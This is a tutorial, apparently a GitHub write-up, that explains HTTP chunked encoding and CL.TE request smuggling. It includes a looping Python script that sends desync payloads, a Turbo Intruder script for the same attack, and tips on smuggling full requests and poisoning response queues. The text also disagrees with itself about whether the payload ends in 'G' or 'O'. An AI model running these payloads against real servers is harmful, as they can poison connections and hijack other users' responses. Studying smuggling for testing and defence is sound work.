A **chunked data request** usually refers to sending or receiving data in smaller parts (chunks), often used in streaming or when you don’t know the total size up front.

Here’s an example using **HTTP chunked transfer encoding** in a raw HTTP request:

---

### Example: HTTP Chunked Data Request

```
POST /upload HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Type: application/json

4
Wiki
5
pedia
E
 in
chunks.
0

```

![chunkexample](https://github.com/user-attachments/assets/73e99609-5a25-4e4d-b575-f6cd8e99e835)





✅ **Explanation:**

* `Transfer-Encoding: chunked` tells the server we are sending the body in parts.
* Each chunk starts with its **length in hexadecimal**, followed by the chunk data.
* The final chunk is `0`, signaling the end.

---


### 🧩 **Use python to test for CLTE for the site as shown by sending raw TCP**

```

import requests
import time

url = "http://localhost"
headers = {
    "Host": "localhost",
    "Content-Length": "100000",
    "Transfer-Encoding": "chunked",
    "Connection": "keep-alive"
}
payload = "0\r\n\r\nO"

while True:
    try:
        response = requests.post(url, headers=headers, data=payload)
        print(f"Sent - Status: {response.status_code}, Length: {len(response.content)}")
        time.sleep(.5)  # Adjust delay as needed
    except KeyboardInterrupt:
        print("\nStopping attack...")
        break
    except Exception as e:
        print(f"Error: {str(e)}")
        time.sleep(1)

---

### 🧩 **What’s happening?**

In your script, the payload is:

```
0\r\n\r\nG
```

Let’s break that down:

* `0\r\n\r\n` → signals **end of chunked transfer body**.
* `G` → **extra data after the end**.

Normally, the server would process:

1. Read chunked body (`0\r\n\r\n` means: body done).
2. Anything **after** that (`G`) may or may not be interpreted as part of the next request, depending on how the server’s HTTP parser works.

This “extra” `G` becomes critical **only if**:
✅ The server keeps the connection open (`Connection: keep-alive`).
✅ The server doesn’t strictly discard extra input after the body.
✅ The parser treats that `G` as part of a pipelined or next request.

---

### ⚠ **Why does the letter matter?**

The reason **only certain letters like `G` work** is because the HTTP parser interprets the next incoming data **as the start of a new request**.

In HTTP/1.1, a request line looks like:

```
<method> <path> HTTP/1.1
```

Common methods are:

* **GET**
* **POST**
* **HEAD**
* **OPTIONS**
* **PUT**
* **DELETE**

Notice the first character:

* `G` → likely triggers `GET` parsing.
* `P` → might start `POST` or `PUT`.
* `H` → might start `HEAD`.
* Random letters like `X`, `Y`, `Z` → **don’t match any HTTP verb** → cause the server to ignore or close the connection.

So, **only when the leftover data starts with a valid HTTP method letter** does the server *continue interpreting* it as part of a new request — leading to:
✅ request smuggling,
✅ request-response desynchronization,
✅ potential response poisoning.

---

### 🔍 **What if you remove the `G` or change it?**

If you change the trailing `G` to something like:

* `X` → not a valid HTTP method → the server drops or errors.
* `GET` → now you have a *full* new request starting, making the attack more aggressive.
* No letter → nothing extra sent, no confusion.

---

### 🛡 **Why is this dangerous?**

This pattern is related to **HTTP request smuggling**, a class of attacks exploiting inconsistencies between how front-end (e.g., proxy, CDN) and back-end (e.g., app server) parse requests.

Here, you manually craft a payload that leaves the connection in a poisoned state, letting you:

* Inject new requests.
* Hijack other users’ responses.
* Cause backend desynchronization.

The trailing `G` **isn’t magic** by itself — it just happens to fit the parser expectations and slip past defensive checks.

---

### 📦 Summary

✅ **The `G` matters because the server tries to interpret it as the start of a new HTTP request (like `GET`).**
✅ Without a valid method letter, the server wouldn’t parse the next part as a new request.
✅ This behavior depends on the server’s and intermediary’s HTTP parser implementation.

---

How to load and run a script in **Turbo Intruder** in **Burp Suite** to simulate your Python desync attack.

---

### ✅ **Step-by-step: Load a Turbo Intruder script**

#### 1. **Install Turbo Intruder**

* Go to **Burp Suite** → **Extensions** tab.
* Click **“BApp Store”**.
* Find **Turbo Intruder**.
* Click **Install**.

#### 2. **Send a request to Turbo Intruder**

* In **Burp Repeater**, craft a basic POST request to your target (e.g., `POST / HTTP/1.1 ...`).
* Right-click on the request.
* Choose: **“Send to Turbo Intruder”**.

#### 3. **Load a custom script**

* Turbo Intruder opens in a new tab with a default script.
* Delete the default code and **paste this custom script**:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           pipeline=False,
                           timeout=10)

    # Raw HTTP request
    req = '''POST / HTTP/1.1
Host: localhost
Content-Length: 100000
Transfer-Encoding: chunked
Connection: keep-alive

0

G'''  # You can change G to O or other characters

    engine.queue(req)

def handleResponse(req, interesting):
    print(f"Status: {req.response.status}, Length: {len(req.response.body)}")
```

#### 4. **Modify the target if needed**

* Make sure the `Host: ...` header and path (`/`) match your server.
* You can use `target.replaceIn` if you want to inject values from wordlists, but for raw attacks like this, hardcoding is fine.

#### 5. **Run the script**

* Click **“Run”** (top-left of the Turbo Intruder tab).
* Watch the **console output** for responses and status codes.

---

### 🧪 **Tips for Testing Desync**

* Vary the trailing letter: `G`, `O`, `P`, `GET`, etc.
* Try adding a second **full HTTP request** after the `0\r\n\r\n` to simulate smuggling.
* Use `pipeline=True` in `RequestEngine` if you're testing response queue poisoning.

---

### 🔒 **Reminder: Use responsibly**

Turbo Intruder is extremely powerful — it can crash or poison servers. Only test on systems you own or have explicit permission to test.

---


